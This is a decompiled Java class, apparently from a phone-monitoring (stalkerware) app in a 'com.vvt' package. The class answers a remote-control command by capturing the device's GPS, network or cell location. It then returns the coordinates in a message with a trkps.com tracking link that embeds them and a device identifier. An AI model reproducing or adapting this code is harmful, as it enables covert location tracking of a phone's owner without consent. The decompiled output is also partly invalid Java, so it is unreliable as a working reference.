package com.vvt.appengine.a;

import android.content.Context;
import android.location.Location;
import android.os.ConditionVariable;
import android.telephony.TelephonyManager;
import com.vvt.capture.location.CallingModule;
import com.vvt.events.FxLocationEvent;
import com.vvt.events.FxLocationMethod;
import com.vvt.location.k;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.text.SimpleDateFormat;

public class l
{
  private static boolean a = com.vvt.ak.a.a;
  private static boolean b = com.vvt.ak.a.e;
  private static boolean c = com.vvt.ak.a.c;
  private ConditionVariable d;
  private com.vvt.base.a e;
  private com.vvt.base.a f;
  private FxLocationEvent g;
  private com.vvt.capture.location.a h;
  private Context i;
  
  public l(com.vvt.capture.location.a parama, com.vvt.base.a parama1, Context paramContext)
  {
    this.h = parama;
    Object localObject = d();
    this.e = ((com.vvt.base.a)localObject);
    localObject = new android/os/ConditionVariable;
    ((ConditionVariable)localObject).<init>();
    this.d = ((ConditionVariable)localObject);
    this.f = parama1;
    this.i = paramContext;
  }
  
  private boolean a(FxLocationEvent paramFxLocationEvent)
  {
    boolean bool1 = true;
    double d1 = 0.0D;
    bool2 = a;
    if (bool2) {}
    for (;;)
    {
      try
      {
        localObject1 = this.i;
        Object localObject3 = "phone";
        localObject1 = ((Context)localObject1).getSystemService((String)localObject3);
        localObject1 = (TelephonyManager)localObject1;
        localObject3 = k.e((TelephonyManager)localObject1);
        double d2 = ((Location)localObject3).getLatitude();
        bool2 = d2 < d1;
        if (bool2) {
          continue;
        }
        d2 = ((Location)localObject3).getLongitude();
        bool2 = d2 < d1;
        if (bool2) {
          continue;
        }
        bool2 = bool1;
        boolean bool3 = a;
        if ((bool3) && (bool2)) {
          continue;
        }
        d2 = ((Location)localObject3).getLongitude();
        paramFxLocationEvent.setLongitude(d2);
        double d3 = ((Location)localObject3).getLatitude();
        paramFxLocationEvent.setLatitude(d3);
        bool2 = bool1;
      }
      catch (Exception localException)
      {
        Object localObject1;
        bool2 = b;
        if (!bool2) {
          continue;
        }
        bool2 = false;
        Object localObject2 = null;
        continue;
        bool2 = false;
        localObject2 = null;
        continue;
      }
      bool1 = a;
      if (bool1) {}
      return bool2;
      bool2 = false;
      localObject1 = null;
    }
  }
  
  private String b(FxLocationEvent paramFxLocationEvent)
  {
    int j = 2;
    int k = 1;
    Object localObject1 = paramFxLocationEvent.getMethod();
    Object localObject2 = FxLocationMethod.INTERGRATED_GPS;
    if (localObject1 == localObject2) {
      localObject1 = "Coordinates received from satellite positioning:";
    }
    for (;;)
    {
      localObject2 = new java/text/SimpleDateFormat;
      ((SimpleDateFormat)localObject2).<init>("dd-MM-yyyy HH:mm");
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject3 = ((StringBuilder)localObject3).append("Date: ");
      Object localObject4 = Long.valueOf(paramFxLocationEvent.getEventTime());
      localObject2 = ((SimpleDateFormat)localObject2).format(localObject4);
      localObject2 = (String)localObject2;
      localObject4 = new Object[j];
      Double localDouble = Double.valueOf(paramFxLocationEvent.getLatitude());
      localObject4[0] = localDouble;
      localDouble = Double.valueOf(paramFxLocationEvent.getLongitude());
      localObject4[k] = localDouble;
      localObject3 = String.format("Coordinates: %s, %s", (Object[])localObject4);
      localObject4 = new java/lang/StringBuilder;
      ((StringBuilder)localObject4).<init>();
      localObject4 = ((StringBuilder)localObject4).append("http://trkps.com/m.php?lat=");
      double d1 = paramFxLocationEvent.getLatitude();
      localObject4 = ((StringBuilder)localObject4).append(d1).append("&long=");
      d1 = paramFxLocationEvent.getLongitude();
      localObject4 = d1 + "&a=%S&i=3520220005602477&z=5";
      Object[] arrayOfObject = new Object[4];
      arrayOfObject[0] = localObject1;
      arrayOfObject[k] = localObject2;
      arrayOfObject[j] = localObject3;
      arrayOfObject[3] = localObject4;
      return String.format("%s\n%s\n%s\n%s", arrayOfObject);
      localObject2 = FxLocationMethod.NETWORK;
      if (localObject1 != localObject2)
      {
        localObject2 = FxLocationMethod.AGPS;
        if (localObject1 != localObject2) {}
      }
      else
      {
        localObject1 = "Coordinates received from network:";
        continue;
      }
      localObject1 = "Coordinates based on cell information:";
    }
  }
  
  private com.vvt.base.a d()
  {
    m localm = new com/vvt/appengine/a/m;
    localm.<init>(this);
    return localm;
  }
  
  public RmtCtrlOutputStatusMessage a()
  {
    boolean bool1 = true;
    Object localObject1 = null;
    boolean bool2 = a;
    if (bool2) {}
    Object localObject2 = this.h;
    Object localObject3 = CallingModule.ON_DEMAND;
    Object localObject4 = this.e;
    ((com.vvt.capture.location.a)localObject2).a((CallingModule)localObject3, (com.vvt.base.a)localObject4);
    bool2 = a;
    if (bool2) {}
    localObject2 = this.h;
    localObject3 = CallingModule.ON_DEMAND;
    ((com.vvt.capture.location.a)localObject2).a((CallingModule)localObject3);
    bool2 = a;
    if (bool2) {}
    this.d.close();
    localObject2 = this.d;
    long l = 300000L;
    boolean bool3 = ((ConditionVariable)localObject2).block(l);
    if (!bool3)
    {
      bool2 = bool1;
      boolean bool4 = a;
      bool2 &= bool4;
      if (bool2) {}
      bool2 = a;
      if (bool2) {}
      localObject2 = this.h;
      localObject4 = CallingModule.ON_DEMAND;
      com.vvt.base.a locala = this.e;
      ((com.vvt.capture.location.a)localObject2).b((CallingModule)localObject4, locala);
      bool2 = a;
      if (bool2) {}
      localObject2 = this.h;
      localObject4 = CallingModule.ON_DEMAND;
      ((com.vvt.capture.location.a)localObject2).b((CallingModule)localObject4);
      localObject2 = new com/vvt/remotecontrol/output/RmtCtrlOutputStatusMessage;
      ((RmtCtrlOutputStatusMessage)localObject2).<init>();
      if (bool3)
      {
        localObject3 = this.g;
        if (localObject3 != null) {
          break label250;
        }
      }
      String str = "Failed to acquire location, please try again later";
      ((RmtCtrlOutputStatusMessage)localObject2).setMessage(str);
      ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(false);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return (RmtCtrlOutputStatusMessage)localObject2;
      bool2 = false;
      localObject2 = null;
      break;
      label250:
      localObject1 = this.g;
      localObject1 = b((FxLocationEvent)localObject1);
      ((RmtCtrlOutputStatusMessage)localObject2).setMessage((String)localObject1);
      ((RmtCtrlOutputStatusMessage)localObject2).setSuccess(bool1);
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/l.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */